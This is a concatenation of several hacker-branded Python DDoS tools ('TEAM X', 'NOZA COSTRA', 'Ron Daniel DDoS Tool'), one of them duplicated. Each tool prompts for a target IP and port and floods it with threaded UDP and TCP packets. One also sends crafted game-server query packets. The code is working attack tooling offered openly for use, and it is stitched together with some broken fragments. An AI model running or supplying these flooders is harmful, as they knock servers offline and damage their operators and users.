import random
import socket
import threading
import platform

print("DDoS is Running in : "+platform.system())

if platform.system() == 'Windows':

	print("""
 TEAM X is Presenting to you :


████████╗███████╗░█████╗░███╗░░░███╗  ██╗░░██╗
╚══██╔══╝██╔════╝██╔══██╗████╗░████║  ╚██╗██╔╝
░░░██║░░░█████╗░░███████║██╔████╔██║  ░╚███╔╝░
░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║  ░██╔██╗░
░░░██║░░░███████╗██║░░██║██║░╚═╝░██║  ██╔╝╚██╗
░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝  ╚═╝░░╚═╝

██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░

Created by Kill4Life

	""")
else :
	print("""
 TEAM X is Presenting to you :


┏━━━━┳━━━┳━━━┳━┓┏━┓┏━┓┏━┓
┃┏┓┏┓┃┏━━┫┏━┓┃┃┗┛┃┃┗┓┗┛┏┛
┗┛┃┃┗┫┗━━┫┃╋┃┃┏┓┏┓┃╋┗┓┏┛
╋╋┃┃╋┃┏━━┫┗━┛┃┃┃┃┃┃╋┏┛┗┓
╋╋┃┃╋┃┗━━┫┏━┓┃┃┃┃┃┃┏┛┏┓┗┓
╋╋┗┛╋┗━━━┻┛╋┗┻┛┗┛┗┛┗━┛┗━┛
┏━━━┳━━━┓╋╋┏━━━┓
┗┓┏┓┣┓┏┓┃╋╋┃┏━┓┃
╋┃┃┃┃┃┃┃┣━━┫┗━━┓
╋┃┃┃┃┃┃┃┃┏┓┣━━┓┃
┏┛┗┛┣┛┗┛┃┗┛┃┗━┛┃
┗━━━┻━━━┻━━┻━━━┛
┏━━━┓┏┓╋┏┓╋╋╋╋╋╋┏┓
┃┏━┓┣┛┗┳┛┗┓╋╋╋╋╋┃┃
┃┃╋┃┣┓┏┻┓┏╋━━┳━━┫┃┏┓
┃┗━┛┃┃┃╋┃┃┃┏┓┃┏━┫┗┛┛
┃┏━┓┃┃┗┓┃┗┫┏┓┃┗━┫┏┓┓
┗┛╋┗┛┗━┛┗━┻┛┗┻━━┻┛┗┛
		""")


print("DDos")
ip= str(input("                   X Server ip X :"))
port= int(input("                   X port X :"))
choice = str(input("                   X DDoS Attack?? (y/n) X :"))
times= int(input("                   X Paket X :"))
threads= int(input("                   X threads X :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"TEAM X TA9TA7EM!!!!!!")
		except:
			print("[!] SERVER DOWN!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[-]","[+]","[x]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"TEAM X TA9TA7EM!!!!!!")
		except:
			s.close()
			print("[*] SERVER DOWN")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
			#AUTHOR : Naruto
#SUBSCRIBE Dev Naruto
import random
import threading
import codecs
import struct
import time
import socket
import sys
import os

os.system("clear")
print("""
"\[\033[0;35m\]"

𝐃𝐝𝐨𝐬 NOZA COSTRA

𝕋𝕆𝕆𝕃𝕊 𝔹𝕐 ℕ𝔸ℝ𝕌𝕋𝕆

╔═══╗─╔╗──────
╚╗╔╗║─║║──────
─║║║╠═╝╠══╦══╗
─║║║║╔╗║╔╗║══╣
╔╝╚╝║╚╝║╚╝╠══║
╚═══╩══╩══╩══╝
╔═══╗╔╗─╔╗─────╔╗──
║╔═╗╠╝╚╦╝╚╗────║║──
║║─║╠╗╔╩╗╔╬══╦═╣║╔╗
║╚═╝║║║─║║║╔╗║╔╣╚╝╝
║╔═╗║║╚╗║╚╣╔╗║╚╣╔╗╗
╚╝─╚╝╚═╝╚═╩╝╚╩═╩╝╚╝

╱╱▏┈┈╱╱╱╱▏╱╱▏
▇╱▏┈┈▇▇▇╱▏▇╱▏
▇╱▏▁┈▇╱▇╱▏▇╱▏▁
▇╱╱╱▏▇╱▇╱▏▇╱╱╱
▇▇▇╱┈▇▇▇╱┈▇▇▇╱ 



""")

ip = str(input(" Target Ip:"))
port = int(input(" Target Port:"))
choice = str(input("Thb Tnik  Serveur? (y/n):"))
times = int(input(" Packet:"))
threads = int(input(" Threads:"))
fake_ip = '182.21.20.32'
#Starting Attacking
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]
def run():
	data = random._urandom(1460)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			print("[!]TEAM NOZA COSTRA TNIK KOLL!!")

def run2():
	data = random._urandom(1204)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*]TEAM NOZA COSTRA TNIK KOLL!!")
            

def run3():
	data = random._urandom(999)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*]TEAM NOZA COSTRA TNIK KOLL!!")
            
  
def run4():
	data = random._urandom(818)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*]TEAM NOZA COSTRA TNIK KOLL!!!")
			
def run5():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*]TEAM NOZA COSTRA TNIK KOLL!!!")
            
#Urandom Dan Pacotes
class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,5)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                    
                

if __name__ == '__main__':
    try:
     for x in range(200):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
         
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
else:
		th = threading.Thread(target = run5)
		th.start
		#AUTHOR : Naruto
#SUBSCRIBE Dev Naruto
import random
import threading
import codecs
import struct
import time
import socket
import sys
import os

os.system("clear")
print("""
"\[\033[0;35m\]"

𝐃𝐝𝐨𝐬 NOZA COSTRA

𝕋𝕆𝕆𝕃𝕊 𝔹𝕐 ℕ𝔸ℝ𝕌𝕋𝕆

╔═══╗─╔╗──────
╚╗╔╗║─║║──────
─║║║╠═╝╠══╦══╗
─║║║║╔╗║╔╗║══╣
╔╝╚╝║╚╝║╚╝╠══║
╚═══╩══╩══╩══╝
╔═══╗╔╗─╔╗─────╔╗──
║╔═╗╠╝╚╦╝╚╗────║║──
║║─║╠╗╔╩╗╔╬══╦═╣║╔╗
║╚═╝║║║─║║║╔╗║╔╣╚╝╝
║╔═╗║║╚╗║╚╣╔╗║╚╣╔╗╗
╚╝─╚╝╚═╝╚═╩╝╚╩═╩╝╚╝

╱╱▏┈┈╱╱╱╱▏╱╱▏
▇╱▏┈┈▇▇▇╱▏▇╱▏
▇╱▏▁┈▇╱▇╱▏▇╱▏▁
▇╱╱╱▏▇╱▇╱▏▇╱╱╱
▇▇▇╱┈▇▇▇╱┈▇▇▇╱ 



""")

ip = str(input(" Target Ip:"))
port = int(input(" Target Port:"))
choice = str(input("Thb Tnik  Serveur? (y/n):"))
times = int(input(" Packet:"))
threads = int(input(" Threads:"))
fake_ip = '182.21.20.32'
#Starting Attacking
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]
def run():
	data = random._urandom(1460)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			print("[!]TEAM NOZA COSTRA TNIK KOLL!!")

def run2():
	data = random._urandom(1204)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*]TEAM NOZA COSTRA TNIK KOLL!!")
            

def run3():
	data = random._urandom(999)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*]TEAM NOZA COSTRA TNIK KOLL!!")
            
  
def run4():
	data = random._urandom(818)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*]TEAM NOZA COSTRA TNIK KOLL!!!")
			
def run5():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*]TEAM NOZA COSTRA TNIK KOLL!!!")
            
#Urandom Dan Pacotes
class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,5)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                    
                

if __name__ == '__main__':
    try:
     for x in range(200):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
         
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
else:
		th = threading.Thread(target = run5)
		th.start()
		()
		import random
import socket
import threading
import time
import os,sys
import random, socket, threading

pasw = "Teamddos"

for i in range(3):
    pwd = input(" Password : ")
    j = 3
    if (pwd == pasw):
        time.sleep(2)
        print("[0] Loading...")
        time.sleep(1)
        print("[10] Loading...")
        print("[20] Loading...")
        time.sleep(1)
        print("[30] Loading...")
        time.sleep(1)
        print("[40] Loading...")
        time.sleep(1)
        print("[50] Loading...")
        time.sleep(1)
        print("[60] Loading...")
        time.sleep(1)
        print("[70] Loading...")
        time.sleep(1)
        print("[80] Loading...")
        time.sleep(1)
        print("[90] Loading...")
        time.sleep(1)
        print("[100] Processing\n")
        time.sleep(2)
        break
    else:
        time.sleep(2)
        print("[x] salah yaaa wkwk \n")
        continue
time.sleep(2)
print("\033[35m Succesfull Logins")
time.sleep(2)

os.system("clear")
print("""
\u001b[35m

██████╗░░█████╗░███╗░░██╗  ██████╗░░█████╗░███╗░░██╗██╗███████╗██╗░░░░░
██╔══██╗██╔══██╗████╗░██║  ██╔══██╗██╔══██╗████╗░██║██║██╔════╝██║░░░░░
██████╔╝██║░░██║██╔██╗██║  ██║░░██║███████║██╔██╗██║██║█████╗░░██║░░░░░
██╔══██╗██║░░██║██║╚████║  ██║░░██║██╔══██║██║╚████║██║██╔══╝░░██║░░░░░
██║░░██║╚█████╔╝██║░╚███║  ██████╔╝██║░░██║██║░╚███║██║███████╗███████╗
╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝  ╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝╚═╝╚══════╝╚══════╝

██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░

████████╗░█████╗░░█████╗░██╗░░░░░
╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
░░░██║░░░██║░░██║██║░░██║██║░░░░░
░░░██║░░░██║░░██║██║░░██║██║░░░░░
░░░██║░░░╚█████╔╝╚█████╔╝███████╗
░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝v2.1

AUTHOR TOOLS : RESCRIPT BY RON DANIEL
Tool Version: RON DANIEL DDOS TOOL V2.1

Ron Daniel""")
print("\033[32m━━━ ah ah ga? (y/n)")
choice = str(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Host/IP")
ip = str(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Port")
port = int(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[32m━━━ Pakets")	
print("\033[32m━━━ Min Pakets 100")
times = int(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Threads")
print("\033[31m━━━ Min Threads 110")
threads = int(input("┗━>\033[0m:"))
def xxxx():
  data = random._urandom(998)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack")

def xxx():
  data = random._urandom(998)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack")

def xx():
  data = random._urandom(871)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Attack")

def x():
  data = random._urandom(871)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Attack")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = xxxx)
    th.start()
    th = threading.Thread(target = xxx)
    th.start()
  else:
    th = threading.Thread(target = xx)
    th.start()
    th = threading.Thread(target = x)
    th.start()